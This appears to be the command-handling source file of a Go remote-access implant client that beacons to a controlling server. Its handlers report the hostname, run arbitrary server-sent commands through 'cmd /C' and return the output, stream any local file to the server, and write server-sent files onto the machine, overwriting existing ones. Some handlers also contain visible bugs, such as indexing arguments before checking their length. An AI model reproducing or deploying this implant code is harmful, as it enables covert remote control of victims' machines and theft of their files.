package main

import (
	"fmt"
	"github.com/WesEfird/MonolithClient/fileutil"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

func CmdPing(c *Client) {
	c.pushMessage("PONG")
}

func CmdSet(c *Client, msgArgs []string) {
	if len(msgArgs) != 4 {
		//fmt.Printf("Malformed SET command: %v\n", msgArgs)
		return
	}
	switch msgArgs[2] {
	case "BEACONRATE":
		rate, err := strconv.Atoi(strings.TrimSpace(msgArgs[3]))
		if err != nil {
			//fmt.Printf("Malformed SET command, argument cannot convert to int: %v\n", msgArgs)
			return
		}
		c.beaconRate = rate
		return
	default:
		//fmt.Printf("SET option: %s not defined", msgArgs[2])
		return
	}

}

func CmdHost(c *Client) {
	c.pushMessage("HOST", []string{c.hostname}...)
}

func CmdExec(c *Client, msgArgs []string) {
	var args []string

	if len(msgArgs) <= 2 {
		//fmt.Printf("Malformed EXEC command: %v\n", msgArgs)
		return
	}
	if len(msgArgs) >= 4 {
		args = msgArgs[2:]
		// Prepend "/C" to the args
		args = append([]string{"/C"}, args...)
	} else {
		args = []string{"/C", msgArgs[2]}
	}
	//fmt.Printf("args: %v\n", args)
	out, err := exec.Command("cmd", args...).CombinedOutput()
	if err != nil {
		c.PushInterMessage(string(out))
		return
	}
	c.PushInterMessage(string(out))
}

// CmdDownloadFile will handle when the endpoint receives a download command, meaning the server is downloading a file
// from the endpoint, and will expect the following arguments:
//
// msgArgs[0] = "CMD:" Message Type
//
// msgArgs[1] = "DFILE" Message descriptor
//
// msgArgs[2] = localPath of file to be uploaded
func CmdDownloadFile(c *Client, msgArgs []string) {
	localPath := msgArgs[2]
	if len(msgArgs) < 3 {
		fmt.Println("malformed DFILE command: ", msgArgs)
		return
	}
	shaHash, err := fileutil.GetShaChecksum(localPath)
	c.pushMessage("FILE", localPath, shaHash)

	f, err := os.Open(localPath)
	if err != nil {
		fmt.Println("err getting handle on file: ", err)
		return
	}
	defer f.Close()
	buf := make([]byte, 4096)
	for {
		n, err := f.Read(buf)
		if err != nil && err != io.EOF {
			fmt.Println("error in file read operation", err)
			return
		}
		if err == io.EOF {
			break
		}
		c.PushFile(buf[:n], localPath)
	}
	c.PushFileEnd(localPath)
}

// CmdUploadFile handles when the endpoint receives an upload command, meaning the server is uploading a file to the endpoint
// and will expect 4 arguments:
//
// msgArgs[0] = "CMD:" message type
//
// msgArgs[1] = "UFILE" message descriptor
//
// msgArgs[2] = remote filename+extension
//
// msgArgs[3] = local file path to write the file
func CmdUploadFile(c *Client, msgArgs []string) {
	if len(msgArgs) < 4 {
		fmt.Println("malformed UFILE command: ", msgArgs)
	}
	var fullPath string
	remoteFileName := msgArgs[2]

	fileInfo, err := os.Stat(msgArgs[3])
	fullPath = msgArgs[3]
	if !os.IsNotExist(err) && !fileInfo.IsDir() {
		os.Remove(fullPath)
	}
	// If the local path is a directory, append the filename to the path to create the full path
	if fileInfo.IsDir() {
		fullPath = filepath.Join(msgArgs[3], remoteFileName)
	}
	// Add the filename and path to the downloadQueue
	c.addDownloadQueue(remoteFileName, fullPath)
	c.pushMessage("UFILE", remoteFileName)
}
